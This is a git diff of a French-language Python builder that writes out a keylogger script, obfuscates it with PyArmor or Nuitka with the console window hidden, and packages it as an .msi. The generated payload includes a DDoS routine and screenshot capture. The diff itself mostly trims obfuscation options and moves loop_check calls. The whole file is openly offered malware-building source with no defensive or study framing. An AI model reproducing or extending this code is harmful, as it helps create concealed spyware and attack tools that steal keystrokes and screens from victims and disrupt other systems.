@@ -254,19 +254,16 @@ def obfuscateur():
     {Style.RESET_ALL}""")
 
     try:
-        option = int(input("Choisissez un obfuscateur (1, 2 ou 3) : "))
+        option = int(input("Choisissez un obfuscateur (1 ou 2 ) : "))
     except ValueError:
-        print("Option invalide. Veuillez entrer un nombre (1, 2 ou 3).")
+        print("Option invalide. Veuillez entrer un nombre (1 ou 2).")
         return
 
     while True:
         if option == 1:
             pyw()
-            pyminifier()
-        elif option == 2:
-            pyw()
             pyarmor()
-        elif option == 3:
+        elif option == 2:
             pyw()
             nuitka()
         else:
@@ -275,20 +272,6 @@ def obfuscateur():
             continue
         
         break
-
-
-def pyminifier():
-    global nom_fichier, temp_script
-    print("[INFO] Création du .pyw temporaire terminé. Lancement de PyMinifier...\n\n")
-    time.sleep(2)
-    try:
-        os.system("python -m pip install pyminifier")
-        cmd = f"pyminifier --obfuscate --outfile={nom_fichier}_obfu.pyw {temp_script}"
-        print(f"[INFO] Exécution : {cmd}")
-        os.system(cmd)
-        messagebox.showinfo("Fini", "Obfuscation PyMinifier terminée.")
-    except Exception as e:
-        messagebox.showerror("Erreur", f"PyMinifier a échoué : {e}")
 
 
 def pyarmor():
@@ -318,6 +301,9 @@ def nuitka():
     """) 
     input("Lisez et appuyez sur Entrée pour continuer...\n\n")
     os.system("pip install nuitka\n\n")
+    print("[INFO] Installation de Nuitka terminée. Lancement de l'obfuscation avec Nuitka...\n\n")
+    time.sleep(2)
+    print(f"[INFO] L'installation prends du temps merci de patienter...\n\n")
     os.system(f'\n\nnuitka --msvc=latest --onefile --windows-disable-console --output-dir=. --show-progress {temp_script}')
 
 
@@ -338,7 +324,7 @@ def lancer_programme():
 
     else:
         messagebox.showinfo(
-            message="Vous allez générer uniquement le keyloger en .msi (install officiel windows)..."
+            message="Vous allez générer uniquement le keyloger en .msi (install officiel windows)... Il vous faut python 3.11"
         )
         msi()
 
@@ -378,8 +364,6 @@ def pyw():
 
         f.write("import urllib3\n")
         f.write("urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n")
-
-        f.write("\nos.system('pip install requests bs4 pynput pillow clipboard cx_Freeze')\n\n")
 
         f.write("import threading\n\n")
 
@@ -483,9 +467,6 @@ def pyw():
         f.write("        asyncio.run(async_ddos_attack())\n")
         f.write("    except ImportError:\n")
         f.write("        print('Module aiohttp non trouvé.')\n\n")
-
-        f.write("loop_check()\n\n")
-
 
 
         # Screenshot
@@ -603,6 +584,7 @@ def pyw():
         for opt, val in config["options"].items():
             if val:
                 f.write(f"    threading.Thread(target={opt}_option_func).start()\n")
+                f.write(f"loop_check()\n")
 
 
         messagebox.showinfo(title="Fini", message="Le fichier a été créer avec succès")
@@ -797,5 +779,3 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
-
-key()
